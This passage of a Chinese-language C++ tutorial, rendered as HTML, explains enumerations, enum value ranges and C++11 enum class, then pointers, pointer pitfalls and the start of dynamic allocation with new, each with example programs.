class="comment">// 将 3 转换为 spectrum 类型 (对应 green)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Band after cast: &quot;</span> &lt;&lt; band &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 比较</span></span><br><span class="line">    <span class="keyword">if</span> (band == green) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The band is green.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在循环中使用 (需要注意类型转换和范围)</span></span><br><span class="line">    <span class="keyword">for</span> (band = red; band &lt;= ultraviolet; band = <span class="keyword">static_cast</span>&lt;spectrum&gt;(band + <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processing band: &quot;</span> &lt;&lt; band &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>枚举的优点:</strong></p><ul><li>  <strong>提高可读性:</strong> 使用有意义的名称（如 <code>red</code>, <code>blue</code>）代替神秘的数字（0, 4）。</li><li>  <strong>类型安全:</strong> 枚举创建了新的类型，有助于防止将不相关的整数值赋给枚举变量（虽然可以通过强制转换绕过）。</li><li>  <strong>代码维护:</strong> 如果需要更改某个常量的值或添加新常量，只需修改枚举定义。</li></ul><h3 id="4-6-1-设置枚举量的值"><a href="#4-6-1-设置枚举量的值" class="headerlink" title="4.6.1 设置枚举量的值"></a>4.6.1 设置枚举量的值</h3><p>可以显式地为枚举量指定整数值。</p><p><strong>规则:</strong></p><ul><li>  使用赋值运算符 <code>=</code> 为枚举量指定值。</li><li>  未被显式赋值的枚举量的值将基于<strong>前一个</strong>枚举量的值加 1。</li><li>  第一个枚举量如果未显式赋值，默认为 0。</li><li>  不同的枚举量可以具有相同的值。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">BitField</span> &#123;</span></span><br><span class="line">    BIT_ZERO,       <span class="comment">// 默认值为 0</span></span><br><span class="line">    BIT_ONE,        <span class="comment">// 默认值为 1</span></span><br><span class="line">    BIT_TWO = <span class="number">4</span>,    <span class="comment">// 显式赋值为 4</span></span><br><span class="line">    BIT_THREE,      <span class="comment">// 值为 BIT_TWO + 1 = 5</span></span><br><span class="line">    BIT_FOUR = <span class="number">8</span>,   <span class="comment">// 显式赋值为 8</span></span><br><span class="line">    BIT_FIVE = <span class="number">8</span>,   <span class="comment">// 显式赋值为 8 (与 BIT_FOUR 相同)</span></span><br><span class="line">    BIT_SIX,        <span class="comment">// 值为 BIT_FIVE + 1 = 9</span></span><br><span class="line">    BIT_SEVEN = BIT_THREE + BIT_FOUR <span class="comment">// 值为 5 + 8 = 13</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BIT_ZERO: &quot;</span> &lt;&lt; BIT_ZERO &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BIT_ONE: &quot;</span> &lt;&lt; BIT_ONE &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;       <span class="comment">// 1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BIT_TWO: &quot;</span> &lt;&lt; BIT_TWO &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;       <span class="comment">// 4</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BIT_THREE: &quot;</span> &lt;&lt; BIT_THREE &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// 5</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BIT_FOUR: &quot;</span> &lt;&lt; BIT_FOUR &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// 8</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BIT_FIVE: &quot;</span> &lt;&lt; BIT_FIVE &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// 8</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BIT_SIX: &quot;</span> &lt;&lt; BIT_SIX &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;       <span class="comment">// 9</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;BIT_SEVEN: &quot;</span> &lt;&lt; BIT_SEVEN &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// 13</span></span><br><span class="line"></span><br><span class="line">    BitField flags = BIT_THREE;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Flags: &quot;</span> &lt;&lt; flags &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-6-2-枚举的取值范围"><a href="#4-6-2-枚举的取值范围" class="headerlink" title="4.6.2 枚举的取值范围"></a>4.6.2 枚举的取值范围</h3><p>虽然枚举量是 <code>int</code> 类型的常量，但枚举类型本身 (<code>spectrum</code>, <code>BitField</code> 等) 的取值范围并不一定等同于 <code>int</code>。</p><p><strong>C++98/03 标准:</strong></p><ul><li>  <strong>底层类型 (Underlying Type):</strong> 编译器会选择一种能够容纳所有枚举量值的<strong>整型</strong>作为该枚举的底层类型。这个类型至少要和 <code>int</code> 一样大，但如果所有枚举量的值可以用更小的类型（如 <code>char</code> 或 <code>short</code>）表示，编译器<strong>可能</strong>会选择更小的类型来节省内存。</li><li><strong>取值范围:</strong> 枚举变量理论上可以存储的值的范围由其底层类型决定。然而，C++ 标准对枚举变量可以<strong>合法持有</strong>的值有更严格的规定。一个枚举变量可以持有的值，其上限是大于最大枚举量值的最小的 2 的幂减 1，下限类似（如果存在负枚举量值，则为小于最小枚举量值的最大的 2 的幂加 1；如果枚举量都非负，则下限为 0）。<ul><li>  例如，对于 <code>enum spectrum &#123;red=0, ..., ultraviolet=7&#125;</code>，最大枚举量是 7。大于 7 的最小的 2 的幂是 8，所以上限是 8 - 1 = 7。下限是 0。因此，<code>spectrum</code> 变量理论上可以持有 0 到 7 范围内的值。</li><li>  对于 <code>enum BitField &#123;..., BIT_SEVEN=13&#125;</code>，最大枚举量是 13。大于 13 的最小的 2 的幂是 16，上限是 16 - 1 = 15。下限是 0。<code>BitField</code> 变量理论上可以持有 0 到 15 范围内的值。</li></ul></li><li>  <strong>赋值限制:</strong> 尽管范围可能比枚举量的值域宽，但 C++ 通常不允许直接将超出枚举量定义范围的整数值赋给枚举变量（即使该整数在理论范围内），需要显式类型转换。</li></ul><p><strong>C++11 作用域内枚举 (Scoped Enumeration):</strong></p><p>C++11 引入了 <code>enum class</code> (或 <code>enum struct</code>)，称为<strong>作用域内枚举</strong>，提供了更强的类型安全和作用域控制：</p><ul><li>  <strong>强类型:</strong> <code>enum class</code> 的枚举量不会隐式转换为整数。</li><li>  <strong>作用域:</strong> 枚举量的名称被限制在枚举类型的作用域内，访问时需要使用 <code>EnumType::Enumerator</code>。</li><li>  <strong>可指定底层类型:</strong> 可以显式指定底层整数类型，例如 <code>enum class Color : unsigned char &#123; Red, Green, Blue &#125;;</code>。</li><li>  <strong>无隐式转换:</strong> 不能将整数直接赋给 <code>enum class</code> 变量，也不能将 <code>enum class</code> 变量隐式转换为整数，都需要显式转换 (<code>static_cast</code>)。</li></ul><p><strong>用法与示例 (范围和 C++11):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">OldEnum</span> &#123;</span> A = <span class="number">1</span>, B = <span class="number">2</span>, C = <span class="number">4</span> &#125;; <span class="comment">// 最大值 4, 范围可能是 0-7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// C++11 作用域内枚举</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">NewEnum</span> &#123;</span> X = <span class="number">10</span>, Y = <span class="number">20</span>, Z = <span class="number">30</span> &#125;; </span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">Status</span> :</span> <span class="keyword">char</span> &#123; OK = <span class="string">&#x27;O&#x27;</span>, Error = <span class="string">&#x27;E&#x27;</span>, Pending = <span class="string">&#x27;P&#x27;</span> &#125;; <span class="comment">// 指定底层类型为 char</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    OldEnum oe;</span><br><span class="line">    <span class="comment">// oe = 7; // 编译错误 (通常不允许直接赋 int)</span></span><br><span class="line">    oe = <span class="keyword">static_cast</span>&lt;OldEnum&gt;(<span class="number">7</span>); <span class="comment">// 合法 (因为 7 在理论范围 0-7 内)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;OldEnum value: &quot;</span> &lt;&lt; oe &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 7</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// oe = static_cast&lt;OldEnum&gt;(8); // 行为未定义或可能编译错误 (超出理论范围)</span></span><br><span class="line"></span><br><span class="line">    NewEnum ne = NewEnum::Y; <span class="comment">// 必须使用作用域解析符</span></span><br><span class="line">    <span class="comment">// int ne_val = ne; // 错误! 不能隐式转换为 int</span></span><br><span class="line">    <span class="keyword">int</span> ne_val = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(ne); <span class="comment">// 需要显式转换</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NewEnum value as int: &quot;</span> &lt;&lt; ne_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 20</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ne = 20; // 错误! 不能将 int 赋给 enum class</span></span><br><span class="line">    ne = <span class="keyword">static_cast</span>&lt;NewEnum&gt;(<span class="number">10</span>); <span class="comment">// 需要显式转换</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NewEnum value after cast: &quot;</span> &lt;&lt; <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(ne) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 10</span></span><br><span class="line"></span><br><span class="line">    Status s = Status::OK;</span><br><span class="line">    <span class="keyword">char</span> s_char = <span class="keyword">static_cast</span>&lt;<span class="keyword">char</span>&gt;(s); <span class="comment">// 转换为底层类型 char</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Status as char: &quot;</span> &lt;&lt; s_char &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 O</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结:</strong><br>传统的 <code>enum</code> 提供了一种创建命名常量的方式，但类型安全较弱，且枚举量会污染所在的作用域。C++11 的 <code>enum class</code> 提供了更强的类型安全和作用域控制，是现代 C++ 中更推荐的选择。在使用传统 <code>enum</code> 时，要注意其取值范围和与整数类型转换的规则。</p><h2 id="4-7-指针和自由存储空间"><a href="#4-7-指针和自由存储空间" class="headerlink" title="4.7 指针和自由存储空间"></a>4.7 指针和自由存储空间</h2><p>到目前为止，我们创建的变量（包括数组、结构等）在声明时，编译器会为其分配内存。这些变量的内存管理是自动的（自动存储或静态存储）。但是，有时我们需要在程序运行时根据需要动态地分配和释放内存。<strong>指针 (Pointer)</strong> 和 <strong>自由存储空间 (Free Store)**（也常称为</strong>堆 Heap**）是实现这一目标的关键。</p><p><strong>指针</strong>是一种特殊的变量，它存储的是另一个变量的<strong>内存地址</strong>。通过指针，我们可以间接地访问和修改该内存地址处的数据。</p><p><strong>自由存储空间</strong>是程序可以动态申请使用的内存区域。与自动变量（函数执行完就销毁）或静态变量（程序整个生命周期都存在）不同，程序员需要手动管理自由存储空间中分配的内存的生命周期。</p><h3 id="4-7-1-声明和初始化指针"><a href="#4-7-1-声明和初始化指针" class="headerlink" title="4.7.1 声明和初始化指针"></a>4.7.1 声明和初始化指针</h3><p><strong>声明指针:</strong></p><p>声明指针需要指定它将指向的数据类型，并在变量名前加上星号 <code>*</code>（星号可以靠近类型名、变量名或在两者之间）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typeName * pointerName; </span><br></pre></td></tr></table></figure><ul><li>  <code>typeName</code>: 指针将要指向的数据的类型。</li><li>  <code>*</code>: 表明 <code>pointerName</code> 是一个指针。</li><li>  <code>pointerName</code>: 指针变量的名称。</li></ul><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> * p_int;      <span class="comment">// 声明一个指向 int 类型的指针 p_int</span></span><br><span class="line"><span class="keyword">double</span> * p_double; <span class="comment">// 声明一个指向 double 类型的指针 p_double</span></span><br><span class="line"><span class="keyword">char</span> * p_char;    <span class="comment">// 声明一个指向 char 类型的指针 p_char</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> * p_str; <span class="comment">// 声明一个指向 string 对象的指针 p_str</span></span><br></pre></td></tr></table></figure><p><strong>获取地址 (<code>&amp;</code> 运算符):</strong></p><p>地址运算符 <code>&amp;</code> 用于获取一个变量的内存地址。</p><p><strong>初始化指针:</strong></p><p>指针在声明时应被初始化，以避免指向不确定的内存地址。常见的初始化方式：</p><ol><li> <strong>初始化为 <code>nullptr</code> (C++11 及以后):</strong> <code>nullptr</code> 是表示空指针的关键字，表示该指针当前不指向任何有效的内存地址。这是推荐的初始化空指针的方式。</li><li> <strong>初始化为 <code>0</code> 或 <code>NULL</code>:</strong> 在 C++11 之前，通常使用 <code>0</code> 或宏 <code>NULL</code> (通常定义为 0) 来表示空指针。虽然仍可用，但 <code>nullptr</code> 类型更安全。</li><li> <strong>初始化为变量地址:</strong> 使用 <code>&amp;</code> 运算符获取一个已存在变量的地址来初始化指针。<strong>指针的类型必须与变量的类型匹配</strong>（或能隐式转换）。</li></ol><p><strong>解引用 (<code>*</code> 运算符):</strong></p><p>解引用运算符 <code>*</code> 用于访问指针所指向的内存地址处存储的值。当 <code>*</code> 用于已初始化的有效指针变量前时，它表示“获取指针指向的值”。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> updates = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">int</span> * p_updates; <span class="comment">// 声明一个指向 int 的指针，未初始化 (危险!)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化指针</span></span><br><span class="line">    <span class="keyword">int</span> * p_value = <span class="literal">nullptr</span>; <span class="comment">// 初始化为空指针 (推荐)</span></span><br><span class="line">    <span class="keyword">int</span> * p_zero = <span class="number">0</span>;      <span class="comment">// 初始化为空指针 (旧式)</span></span><br><span class="line">    <span class="comment">// NULL 宏通常在 &lt;cstddef&gt; 或其他 C 头文件中定义</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用地址初始化</span></span><br><span class="line">    p_updates = &amp;updates; <span class="comment">// 将 updates 变量的地址赋给 p_updates</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问指针信息</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value of updates: &quot;</span> &lt;&lt; updates &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;             <span class="comment">// 输出 6</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address of updates: &quot;</span> &lt;&lt; &amp;updates &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;          <span class="comment">// 输出 updates 的内存地址</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value of p_updates (address): &quot;</span> &lt;&lt; p_updates &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出存储在 p_updates 中的地址 (同上)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用解引用运算符访问指针指向的值</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value at *p_updates: &quot;</span> &lt;&lt; *p_updates &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 6 (updates 的值)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用解引用运算符修改指针指向的值</span></span><br><span class="line">    *p_updates = *p_updates + <span class="number">1</span>; <span class="comment">// 将 p_updates 指向的值 (updates) 加 1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Now updates has value: &quot;</span> &lt;&lt; updates &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 7</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指向其他类型</span></span><br><span class="line">    <span class="keyword">double</span> price = <span class="number">99.99</span>;</span><br><span class="line">    <span class="keyword">double</span> * p_price = &amp;price; <span class="comment">// p_price 指向 price</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value at *p_price: &quot;</span> &lt;&lt; *p_price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 99.99</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// int * p_wrong = &amp;price; // 错误! 指针类型 (int*) 与变量类型 (double) 不匹配</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>关键点:</strong></p><ul><li>  <code>int updates;</code>: <code>updates</code> 是一个 <code>int</code> 变量。</li><li>  <code>int * p_updates;</code>: <code>p_updates</code> 是一个指针变量，它存储的是一个 <code>int</code> 变量的地址。</li><li>  <code>p_updates</code>: 存储的地址值。</li><li>  <code>*p_updates</code>: 存储在该地址处的 <code>int</code> 值。</li></ul><h3 id="4-7-2-指针的危险"><a href="#4-7-2-指针的危险" class="headerlink" title="4.7.2 指针的危险"></a>4.7.2 指针的危险</h3><p>指针非常强大，但也容易出错，是 C++ 中常见的 bug 来源。</p><ol><li><strong>解引用未初始化的指针:</strong> 如果指针没有被初始化，它会包含一个随机的地址（垃圾值）。解引用这种指针（试图访问该随机地址处的值）会导致<strong>未定义行为</strong>，通常导致程序崩溃。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> * p_uninitialized;</span><br><span class="line"><span class="comment">// std::cout &lt;&lt; *p_uninitialized; // 极度危险! 程序可能崩溃</span></span><br><span class="line"><span class="comment">// *p_uninitialized = 100;      // 极度危险! 可能覆盖关键数据或导致崩溃</span></span><br></pre></td></tr></table></figure></li><li><strong>解引用空指针:</strong> 解引用 <code>nullptr</code> (或 <code>0</code>, <code>NULL</code>) 同样是未定义行为，通常也会导致程序崩溃。在使用指针前，最好检查它是否为空。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> * p_null = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="comment">// std::cout &lt;&lt; *p_null; // 危险! 程序可能崩溃</span></span><br><span class="line"><span class="keyword">if</span> (p_null != <span class="literal">nullptr</span>) &#123; <span class="comment">// 检查指针是否有效</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; *p_null; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>悬挂指针 (Dangling Pointer):</strong> 当指针指向的内存已经被释放或不再有效时，该指针就成为悬挂指针。解引用悬挂指针也是未定义行为。这通常发生在 <code>delete</code> 之后（见 4.7.5）或指向局部变量的指针在其作用域结束后仍然存在时。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> * p_dangle;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> local_var = <span class="number">10</span>;</span><br><span class="line">    p_dangle = &amp;local_var; <span class="comment">// p_dangle 指向局部变量</span></span><br><span class="line">&#125; <span class="comment">// local_var 在这里被销毁，内存可能被回收</span></span><br><span class="line"><span class="comment">// std::cout &lt;&lt; *p_dangle; // 危险! p_dangle 是悬挂指针</span></span><br></pre></td></tr></table></figure></li><li> <strong>内存泄漏 (Memory Leak):</strong> 如果使用 <code>new</code> 分配了内存（见 4.7.4），但忘记使用 <code>delete</code> 释放，或者丢失了指向该内存的唯一指针，这块内存就无法再被程序访问或释放，造成内存泄漏。程序运行时间越长，泄漏的内存越多，最终可能耗尽系统资源。</li></ol><p><strong>安全使用指针的建议:</strong></p><ul><li>  <strong>总是初始化指针:</strong> 声明指针时立即初始化为 <code>nullptr</code> 或一个有效的地址。</li><li>  <strong>在使用前检查:</strong> 在解引用指针前，检查它是否为 <code>nullptr</code>。</li><li>  <strong>谨慎处理指针生命周期:</strong> 确保指针指向的内存在指针使用期间是有效的。</li><li>  <strong>配对 <code>new</code> 和 <code>delete</code>:</strong> 动态分配的内存必须手动释放。</li></ul><h3 id="4-7-3-指针和数字"><a href="#4-7-3-指针和数字" class="headerlink" title="4.7.3 指针和数字"></a>4.7.3 指针和数字</h3><p>虽然指针存储的是内存地址，而地址本质上是数字，但<strong>指针类型和整数类型是不同的</strong>。不能随意将整数赋给指针（除了 <code>0</code>/<code>nullptr</code>），也不能直接将指针当作普通整数进行算术运算（指针算术有特殊规则，见 4.8）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> * p_value = &amp;value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指针的值是地址 (一个数字)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address stored in p_value: &quot;</span> &lt;&lt; p_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不能直接将任意整数赋给指针</span></span><br><span class="line">    <span class="comment">// p_value = 1000; // 错误! 类型不匹配 (除非使用 reinterpret_cast，但通常不安全)</span></span><br><span class="line">    </span><br><span class="line">    p_value = <span class="literal">nullptr</span>; <span class="comment">// 合法，赋空指针</span></span><br><span class="line">    p_value = <span class="number">0</span>;       <span class="comment">// 合法，赋空指针</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指针可以转换为整数 (通常使用 reinterpret_cast，不推荐)</span></span><br><span class="line">    <span class="comment">// uintptr_t address_as_int = reinterpret_cast&lt;uintptr_t&gt;(p_value); </span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Address as integer: &quot; &lt;&lt; address_as_int &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 整数不能直接转换为指针 (除了 0)</span></span><br><span class="line">    <span class="keyword">int</span> address_int = <span class="number">2000</span>;</span><br><span class="line">    <span class="comment">// int * p_from_int = address_int; // 错误!</span></span><br><span class="line">    <span class="comment">// int * p_from_int = reinterpret_cast&lt;int*&gt;(address_int); // 可以编译，但极度危险</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将指针视为地址，而不是普通的数字，有助于避免类型错误和不安全的操作。</p><h3 id="4-7-4-使用new来分配内存"><a href="#4-7-4-使用new来分配内存" class="headerlink" title="4.7.4 使用new来分配内存"></a>4.7.4 使用new来分配内存</h3><p><code>new</code> 运算符用于在程序的<strong>自由存储区 (Free Store)</strong> 或 <strong>堆 (Heap)</strong> 上动态分配内存。这允许你在运行时根据需要创建变量或对象，而不是在编译时就确定。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pointerVariable = <span class="keyword">new</span> typeName;</span><br><span class="line"><span 